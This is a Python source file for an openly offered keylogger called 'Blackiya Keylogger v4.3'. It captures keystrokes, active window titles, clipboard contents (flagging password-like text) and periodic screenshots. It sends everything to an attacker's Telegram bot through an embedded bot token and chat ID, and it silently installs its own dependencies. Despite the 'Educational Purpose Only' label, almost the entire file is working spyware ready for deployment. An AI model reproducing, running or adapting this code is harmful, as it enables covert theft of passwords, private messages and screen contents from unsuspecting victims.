#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         BLACKIYA KEYLOGGER v4.3                               ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  Author: BlAck1ya                                                             ║
║  GitHub: https://github.com/BlAck1ya/BlackiyaKeylogger                       ║
║  Version: 4.3 (FINAL - NO DUPLICATES)                                        ║
║  License: Educational Purpose Only                                           ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import threading
import subprocess
import platform
import socket
import getpass
from datetime import datetime

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = "8703470305:AAFqY1EIERK0EgjbbpZMyz4f-0FQCjT6_W4"
TELEGRAM_CHAT_ID = "5810040310"

SEND_DELAY = 1.5
MAX_BUFFER = 500
SCREENSHOT_INTERVAL = 45
ENABLE_SCREENSHOTS = True
ENABLE_CLIPBOARD = True

HOME_DIR = os.path.expanduser("~")
LOG_DIR = os.path.join(HOME_DIR, ".cache", "blackiya_logs")
os.makedirs(LOG_DIR, exist_ok=True)

__author__ = "BlAck1ya"
__github__ = "https://github.com/BlAck1ya/BlackiyaKeylogger"
__version__ = "4.3"

print(f"""
╔══════════════════════════════════════════════════════════════════╗
║                    BLACKIYA KEYLOGGER v{__version__}                      ║
╠══════════════════════════════════════════════════════════════════╣
║  Author : {__author__}                                              ║
║  GitHub : {__github__}                             ║
║  Type   : Educational Security Tool                            ║
╠══════════════════════════════════════════════════════════════════╣
║  [!] FINAL FIX: NO DUPLICATE MESSAGES!                         ║
╚══════════════════════════════════════════════════════════════════╝
""")

# ==================== DEPENDENCIES ====================
def install_dependencies():
    for package in ['requests', 'pynput']:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
install_dependencies()

import requests
from pynput import keyboard

# ==================== TELEGRAM ====================
def tg_send(text):
    if not text.strip():
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def tg_send_file(path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(path, 'rb') as f:
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, files={"document": f}, timeout=30)
    except:
        pass

# ==================== WINDOW TRACKER ====================
_current_window = "Unknown"

def get_active_window():
    global _current_window
    try:
        if platform.system() == "Linux":
            win_id = subprocess.run(['xdotool', 'getactivewindow'], capture_output=True, text=True, timeout=0.3).stdout.strip()
            if win_id:
                win_name = subprocess.run(['xdotool', 'getwindowname', win_id], capture_output=True, text=True, timeout=0.3).stdout.strip()
                _current_window = win_name[:45] if win_name else "Unknown"
    except:
        pass
    return _current_window

# ==================== SCREENSHOT ====================
def capture_screenshot():
    path = os.path.join(LOG_DIR, f"ss_{int(time.time())}.png")
    try:
        subprocess.run(['scrot', path], timeout=5, capture_output=True)
        return path if os.path.exists(path) and os.path.getsize(path) > 1000 else None
    except:
        return None

def screenshot_loop():
    while ENABLE_SCREENSHOTS:
        time.sleep(SCREENSHOT_INTERVAL)
        path = capture_screenshot()
        if path:
            tg_send_file(path, f"📸 {datetime.now().strftime('%H:%M:%S')}")
            os.remove(path)

# ==================== CLIPBOARD ====================
_last_clip = ""

def clipboard_loop():
    global _last_clip
    while ENABLE_CLIPBOARD:
        try:
            import pyperclip
            curr = pyperclip.paste()
            if curr and curr != _last_clip and len(curr) > 5:
                _last_clip = curr
                icon = "🔐" if any(w in curr.lower() for w in ['password', 'pass', 'secret', 'key']) else "📋"
                tg_send(f"{icon} Clipboard:\n```\n{curr[:1000]}\n```")
        except:
            pass
        time.sleep(2)

# ==================== KEYLOGGER - FINAL NO DUPLICATE ====================
class BlackiyaKeylogger:
    def __init__(self):
        self.text = ""
        self.last_key_time = time.time()
        self.total = 0
        self.running = True
        self.lock = threading.Lock()
        self.last_sent = ""  # Track last sent message
        self.last_key = ""   # Track last key pressed
        self.last_key_time_same = 0
    
    def add(self, char):
        with self.lock:
            # FIX: Ignore if same key pressed within 0.1 seconds (key repeat)
            now = time.time()
            if char == self.last_key and (now - self.last_key_time_same) < 0.1:
                return  # Skip duplicate from key repeat
            self.last_key = char
            self.last_key_time_same = now
            
            self.text += char
            self.last_key_time = now
            self.total += 1
            
            if len(self.text) >= MAX_BUFFER:
                self.flush()
    
    def flush(self):
        with self.lock:
            if not self.text.strip():
                return
            
            msg = self.text.strip()
            
            # FIX: Don't send same message again
            if msg == self.last_sent:
                self.text = ""
                return
            
            self.last_sent = msg
            window = get_active_window()
            is_browser = any(b in window.lower() for b in ['chrome', 'firefox', 'edge', 'brave', 'opera'])
            icon = "🌐" if is_browser else "💻"
            
            final = f"{icon} **{datetime.now().strftime('%H:%M:%S')}** `{window[:35]}`\n```\n{msg}\n```"
            tg_send(final)
            
            with open(os.path.join(LOG_DIR, "keys.log"), "a", encoding='utf-8') as f:
                f.write(f"{datetime.now()} [{window}] {msg}\n")
            
            self.text = ""
    
    def start(self):
        def on_press(key):
            try:
                if hasattr(key, 'char') and key.char:
                    self.add(key.char)
                else:
                    sp = str(key).replace('Key.', '').replace("'", "")
                    if sp == 'space':
                        self.add(' ')
                    elif sp == 'enter':
                        self.add('\n')
                        self.flush()
                    elif sp == 'backspace':
                        with self.lock:
                            if self.text:
                                self.text = self.text[:-1]
                    elif sp not in ['ctrl_l', 'ctrl_r', 'alt_l', 'alt_r', 'shift_l', 'shift_r']:
                        self.add(f' [{sp.upper()}] ')
            except:
                pass
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        
        def timer():
            while self.running:
                time.sleep(0.3)
                if time.time() - self.last_key_time > SEND_DELAY and self.text:
                    self.flush()
        threading.Thread(target=timer, daemon=True).start()
        return True

# ==================== SYSTEM INFO ====================
def get_system_info():
    return f"""
🚀 BLACKIYA v{__version__} ACTIVE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 {__author__}
🖥️ {socket.gethostname()}
💿 {platform.system()} {platform.release()}
✅ NO DUPLICATES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ==================== STATS ====================
start = time.time()

def stats(k):
    while True:
        time.sleep(300)
        tg_send(f"📊 STATS\n🔑 {k.total} keys\n⏱️ {int(time.time()-start)}s")

# ==================== MAIN ====================
def main():
    tg_send(get_system_info())
    
    k = BlackiyaKeylogger()
    k.start()
    print("[✓] Keylogger: ACTIVE - NO DUPLICATES")
    
    threading.Thread(target=window_monitor, daemon=True).start()
    threading.Thread(target=clipboard_loop, daemon=True).start()
    threading.Thread(target=screenshot_loop, daemon=True).start()
    threading.Thread(target=stats, args=(k,), daemon=True).start()
    
    print("[✓] All modules active")
    print("\n[*] Press Ctrl+C to stop\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        tg_send(f"🔴 STOPPED\n📊 {k.total} keys\n⏱️ {int(time.time()-start)}s")
        print("\n[✓] Stopped")

# ==================== WINDOW MONITOR ====================
_last_win_sent = ""

def window_monitor():
    global _last_win_sent
    while True:
        win = get_active_window()
        if win != _last_win_sent and win != "Unknown":
            _last_win_sent = win
            tg_send(f"🪟 Window: `{win[:80]}`")
        time.sleep(2)

if __name__ == "__main__":
    main()
